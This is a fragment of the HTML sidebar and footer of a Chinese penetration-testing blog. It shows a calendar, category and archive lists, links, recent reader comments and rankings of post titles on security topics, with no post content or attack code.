<a href="javascript:void(0)" onclick="follow('cdf9cbfa-429b-e611-845c-ac853d9f53ac')">+加关注</a></div>
        <script>getFollowStatus('cdf9cbfa-429b-e611-845c-ac853d9f53ac');</script>
    </div>
</div>
</div>

</div>

<div id="sidebar_ad"></div>
			<div id="calendar"><div id="blog-calendar" style="">

<table id="blogCalendar" class="Cal" title="Calendar" cellspacing="0" cellpadding="0" border="0">
    <tbody>
        <tr>
            <td colspan="7">
                <table class="CalTitle" cellspacing="0" border="0">
                    <tbody>
                        <tr>
                            <td class="CalNextPrev">
                                <a href="javascript:void(0);" onclick="loadBlogCalendar('2020/07/03'); return false;">&lt;</a>
                            </td>
                            <td align="center">2020年8月</td>
                            <td class="CalNextPrev" align="right">
                                <a href="javascript:void(0);" onclick="loadBlogCalendar('2020/09/03'); return false;">&gt;</a>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    <tr>
        <th class="CalDayHeader" abbr="日" scope="col" align="center">日</th>
        <th class="CalDayHeader" abbr="一" scope="col" align="center">一</th>
        <th class="CalDayHeader" abbr="二" scope="col" align="center">二</th>
        <th class="CalDayHeader" abbr="三" scope="col" align="center">三</th>
        <th class="CalDayHeader" abbr="四" scope="col" align="center">四</th>
        <th class="CalDayHeader" abbr="五" scope="col" align="center">五</th>
        <th class="CalDayHeader" abbr="六" scope="col" align="center">六</th>
    </tr>
            <tr>
                            <td class="CalOtherMonthDay" align="center">26</td>
                            <td class="CalOtherMonthDay" align="center">27</td>
                            <td class="CalOtherMonthDay" align="center">28</td>
                            <td class="CalOtherMonthDay" align="center">29</td>
                            <td class="CalOtherMonthDay" align="center">30</td>
                            <td class="CalOtherMonthDay" align="center">31</td>
                    <td class="CalWeekendDay" align="center">
                        1
                    </td>
            </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            2
                        </td>
                            <td class="CalTodayDay" align="center">
                                3
                            </td>
                            <td class="" align="center">
                                4
                            </td>
                            <td class="" align="center">
                                5
                            </td>
                            <td class="" align="center">
                                6
                            </td>
                            <td class="" align="center">
                                7
                            </td>
                        <td class="CalWeekendDay" align="center">
                            8
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            9
                        </td>
                            <td class="" align="center">
                                10
                            </td>
                            <td class="" align="center">
                                11
                            </td>
                            <td class="" align="center">
                                12
                            </td>
                            <td class="" align="center">
                                13
                            </td>
                            <td class="" align="center">
                                14
                            </td>
                        <td class="CalWeekendDay" align="center">
                            15
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            16
                        </td>
                            <td class="" align="center">
                                17
                            </td>
                            <td class="" align="center">
                                18
                            </td>
                            <td class="" align="center">
                                19
                            </td>
                            <td class="" align="center">
                                20
                            </td>
                            <td class="" align="center">
                                21
                            </td>
                        <td class="CalWeekendDay" align="center">
                            22
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            23
                        </td>
                            <td class="" align="center">
                                24
                            </td>
                            <td class="" align="center">
                                25
                            </td>
                            <td class="" align="center">
                                26
                            </td>
                            <td class="" align="center">
                                27
                            </td>
                            <td class="" align="center">
                                28
                            </td>
                        <td class="CalWeekendDay" align="center">
                            29
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            30
                        </td>
                            <td class="" align="center">
                                31
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                1
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                2
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                3
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                4
                            </td>
                        <td class="CalOtherMonthDay" align="center">
                            5
                        </td>
                </tr>
    </tbody>
</table></div><script>loadBlogDefaultCalendar();</script></div>
			
			<div id="leftcontentcontainer">
				<div id="blog-sidecolumn">
<!-- 搜索 -->
<div id="sidebar_search" class="sidebar-block">
    <div id="sidebar_search" class="mySearch">
        <h3 class="catListTitle">搜索</h3>
        <div id="sidebar_search_box">
            <div id="widget_my_zzk" class="div_my_zzk">
                <input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk">
            </div>
            <div id="widget_my_google" class="div_my_zzk">
                <input type="text" name="google_q" id="google_q" onkeydown="return google_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="google_go()" type="button" value="谷歌搜索" class="btn_my_zzk">
            </div>
        </div>
    </div>
</div>

<!-- 常用链接 -->
<div id="sidebar_shortcut" class="sidebar-block">
    <div class="catListLink">
<h3 class="catListTitle">
常用链接
</h3>
<ul>
    
<li><a href="https://www.cnblogs.com/backlion/p/" title="我的博客的随笔列表">我的随笔</a></li>
<li><a href="https://www.cnblogs.com/backlion/MyComments.html" title="我的发表过的评论列表">我的评论</a></li>
<li><a href="https://www.cnblogs.com/backlion/OtherPosts.html" title="我评论过的随笔列表">我的参与</a></li>
<li><a href="https://www.cnblogs.com/backlion/RecentComments.html" title="我的博客的评论列表">最新评论</a></li>
<li><a href="https://www.cnblogs.com/backlion/tag/" title="我的博客的标签列表">我的标签</a></li>

    <li><a id="itemListLink" onclick="this.blur();WarpClass('itemListLink', 'itemListLin_con');return false;" href="#">更多链接</a></li>
</ul>
</div>


</div>

<!-- 最新随笔 -->



<!-- 我的标签 -->
<div id="sidebar_toptags" class="sidebar-block">
    <div class="catListTag">
<h3 class="catListTitle">我的标签</h3>
<ul>

        <li>
            <a href="https://www.cnblogs.com/backlion/tag/linux%2Bapache%2Bmysql%2Bphp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">linux+apache+mysql+php环境搭建</a>(2)
        </li>
        <li>
            <a href="https://www.cnblogs.com/backlion/tag/Metasploit%26%2339%3Bs%20Hardware%20Bridge/">Metasploit's Hardware Bridge</a>(1)
        </li>
        <li>
            <a href="https://www.cnblogs.com/backlion/tag/mimikazhi%20Kerberos/">mimikazhi Kerberos</a>(1)
        </li>
        <li>
            <a href="https://www.cnblogs.com/backlion/tag/msfvenom/">msfvenom</a>(1)
        </li>
        <li>
            <a href="https://www.cnblogs.com/backlion/tag/kali/">kali</a>(1)
        </li>
    

</ul>
</div>


</div>

<!-- 积分与排名 -->


<!-- 随笔分类、随笔档案、文章分类、新闻分类、相册、链接 -->
<div id="sidebar_categories">
    
<div class="catListPostCategory">
<h3 class="catListTitle">

随笔分类


</h3>


<ul>

<li>
<a href="https://www.cnblogs.com/backlion/category/900354.html" rel="" target="">
    kali渗透(11)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/900356.html" rel="" target="">
    web渗透(17)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/900357.html" rel="" target="">
    安全运维(10)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1396922.html" rel="" target="">
    靶机攻击(6)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1181223.html" rel="" target="">
    代码审计(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1367440.html" rel="" target="">
    红蓝对抗(11)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1181215.html" rel="" target="">
    漏洞复现(25)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1181218.html" rel="" target="">
    漏洞总结(10)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/900352.html" rel="" target="">
    内网渗透(28)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1367442.html" rel="" target="">
    企业安全建设(13)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/1181220.html" rel="" target="">
    淫技技巧(30)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/category/900353.html" rel="" target="">
    域内渗透(18)
</a>
 
</li>

</ul>


</div>
<div class="catListPostArchive">
<h3 class="catListTitle">

随笔档案


</h3>


<ul>

<li>
<a href="https://www.cnblogs.com/backlion/archive/2020/08.html" rel="" target="">
    2020年8月(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2020/06.html" rel="" target="">
    2020年6月(4)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2020/05.html" rel="" target="">
    2020年5月(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2020/02.html" rel="" target="">
    2020年2月(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/09.html" rel="" target="">
    2019年9月(7)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/08.html" rel="" target="">
    2019年8月(4)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/07.html" rel="" target="">
    2019年7月(2)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/06.html" rel="" target="">
    2019年6月(5)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/05.html" rel="" target="">
    2019年5月(2)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/04.html" rel="" target="">
    2019年4月(6)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/03.html" rel="" target="">
    2019年3月(26)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/02.html" rel="" target="">
    2019年2月(8)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2019/01.html" rel="" target="">
    2019年1月(4)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/12.html" rel="" target="">
    2018年12月(9)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/11.html" rel="" target="">
    2018年11月(3)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/10.html" rel="" target="">
    2018年10月(2)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/09.html" rel="" target="">
    2018年9月(5)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/08.html" rel="" target="">
    2018年8月(11)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/07.html" rel="" target="">
    2018年7月(3)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/06.html" rel="" target="">
    2018年6月(5)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/05.html" rel="" target="">
    2018年5月(7)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/03.html" rel="" target="">
    2018年3月(9)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2018/01.html" rel="" target="">
    2018年1月(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/12.html" rel="" target="">
    2017年12月(4)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/11.html" rel="" target="">
    2017年11月(4)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/09.html" rel="" target="">
    2017年9月(4)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/08.html" rel="" target="">
    2017年8月(10)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/07.html" rel="" target="">
    2017年7月(5)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/06.html" rel="" target="">
    2017年6月(6)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/05.html" rel="" target="">
    2017年5月(15)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/04.html" rel="" target="">
    2017年4月(6)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/03.html" rel="" target="">
    2017年3月(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2017/02.html" rel="" target="">
    2017年2月(2)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2016/11.html" rel="" target="">
    2016年11月(1)
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/backlion/archive/2016/10.html" rel="" target="">
    2016年10月(2)
</a>
 
</li>

</ul>


</div>
<div class="catListImageCategory">
<h3 class="catListTitle">

相册


</h3>


<ul>

<li>
<a href="https://www.cnblogs.com/backlion/gallery/1300217.html" rel="nofollow noopener noreferrer" target="">
    image(1)
</a>
 
</li>

</ul>


</div>
<div class="catList">
<h3 class="catListTitle">

友情链接


</h3>


<ul>

<li>
<a href="https://evi1cg.me/" rel="nofollow noopener noreferrer" target="">
    evi1cg
</a>
 
</li>
<li>
<a href="https://www.somd5.com/" rel="nofollow noopener noreferrer" target="_blank">
    SOMD5
</a>
 
</li>
<li>
<a href="https://www.cnblogs.com/klionsec/" rel="nofollow noopener noreferrer" target="">
    klionsec
</a>
 
</li>
<li>
<a href="http://www.intruder.online/" rel="nofollow noopener noreferrer" target="">
    入侵者在线
</a>
 
</li>
<li>
<a href="https://3gstudent.github.io/" rel="nofollow noopener noreferrer" target="">
    三好学生博客
</a>
 
</li>

</ul>


</div>


</div>

<!-- 最新评论 -->
<div id="sidebar_recentcomments" class="sidebar-block">
    <div class="catListComment">
<h3 class="catListTitle">最新评论</h3>

	<div class="RecentCommentBlock">
        <ul>
                    <li class="recent_comment_title"><a href="https://www.cnblogs.com/backlion/p/10329664.html">1. Re:wazhu之agent manage</a></li>
                    <li class="recent_comment_body">[root@wazhu-manage ~]# curl -u wazuh-api:wazu123 " 在我自己终端执行这条命令，没有显示正常页面 。curl: (52) Empty reply fro...</li>
                    <li class="recent_comment_author">--ChArtemis</li>
                    <li class="recent_comment_title"><a href="https://www.cnblogs.com/backlion/p/10329664.html">2. Re:wazhu之agent manage</a></li>
                    <li class="recent_comment_body"><p>curl: (52) Empty reply from server</p>
</li>
                    <li class="recent_comment_author">--ChArtemis</li>
                    <li class="recent_comment_title"><a href="https://www.cnblogs.com/backlion/p/9302528.html">3. Re:XML外部实体（XXE）注入详解</a></li>
                    <li class="recent_comment_body"><p>NBNB</p>
</li>
                    <li class="recent_comment_author">--klown</li>
                    <li class="recent_comment_title"><a href="https://www.cnblogs.com/backlion/p/9302528.html">4. Re:XML外部实体（XXE）注入详解</a></li>
                    <li class="recent_comment_body"><p>我看到过最全的了</p>
</li>
                    <li class="recent_comment_author">--TriompheL</li>
                    <li class="recent_comment_title"><a href="https://www.cnblogs.com/backlion/p/9302528.html">5. Re:XML外部实体（XXE）注入详解</a></li>
                    <li class="recent_comment_body"><p>今天复习的时候看到这篇文章，说实话看到一半我有点没耐心了，于是翻到评论区吐槽一下：：大佬！收下我的膝盖！</p>
</li>
                    <li class="recent_comment_author">--活的admin</li>
        </ul>
    </div>
</div>


</div>



<!-- 阅读排行榜 -->
<div id="sidebar_topviewedposts" class="sidebar-block">
    <div class="catListView">
<h3 class="catListTitle">阅读排行榜</h3>
	<div id="TopViewPostsBlock">
        <ul style="word-break:break-all">
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/9484949.html">
                            1. Meterpreter命令详解(51398)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/10106676.html">
                            2. ThinkPHP 5.x远程命令执行漏洞分析与复现(51349)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/9302528.html">
                            3. XML外部实体（XXE）注入详解(36945)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/6804863.html">
                            4. smb(ms17-010)远程命令执行之msf(35643)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/9484950.html">
                            5. Meterpreter提权详解(14024)
                        </a>
                    </li>
        </ul>
    </div>
</div>


</div>

<!-- 评论排行榜 -->
<div id="sidebar_topcommentedposts" class="sidebar-block">
    <div class="catListFeedback">
<h3 class="catListTitle">评论排行榜</h3>
	<div id="TopFeedbackPostsBlock">
        <ul style="word-break:break-all">
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/9484949.html">
                            1. Meterpreter命令详解(4)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/9302528.html">
                            2. XML外部实体（XXE）注入详解(4)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/10329664.html">
                            3. wazhu之agent manage(2)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/6804863.html">
                            4. smb(ms17-010)远程命令执行之msf(2)
                        </a>
                    </li>
                    <li>
                        <a href="https://www.cnblogs.com/backlion/p/6873210.html">
                            5. (转）搭建本地 8.8 W 乌云漏洞库(2)
                        </a>
                    </li>
        </ul>
    </div>
</div>


</div>

<!-- 推荐排行榜 -->
<div id="sidebar_topdiggedposts" class="sidebar-block">
    <div id="topdigg_posts_wrap">
    <div class="catListView">
        <h3 class="catListTitle">推荐排行榜</h3>
        <div id="TopDiggPostsBlock">
            <ul style="word-break: break-all">
                        <li>
                            <a href="https://www.cnblogs.com/backlion/p/9484949.html">
                                1. Meterpreter命令详解(4)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/backlion/p/9302528.html">
                                2. XML外部实体（XXE）注入详解(3)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/backlion/p/8554749.html">
                                3. xpath注入详解(2)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/backlion/p/8127868.html">
                                4. Kerberos的黄金票据详解(2)
                            </a>
                        </li>
                        <li>
                            <a href="https://www.cnblogs.com/backlion/p/11435746.html">
                                5. 实战攻防演习之红队(2)
                            </a>
                        </li>
            </ul>
        </div>
    </div>
</div>
</div></div>
                    <script>loadBlogSideColumn();</script>
			</div>
			
		</div><!--end: sideBarMain -->
	</div><!--end: sideBar 侧边栏容器 -->
	<div class="clear"></div>
	</div><!--end: main -->
	<div class="clear"></div>
	<div id="footer">
		<!--done-->
Copyright © 2020 渗透测试中心
<br><span id="poweredby">Powered by .NET Core on Kubernetes</span>



	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->


    


</body></html>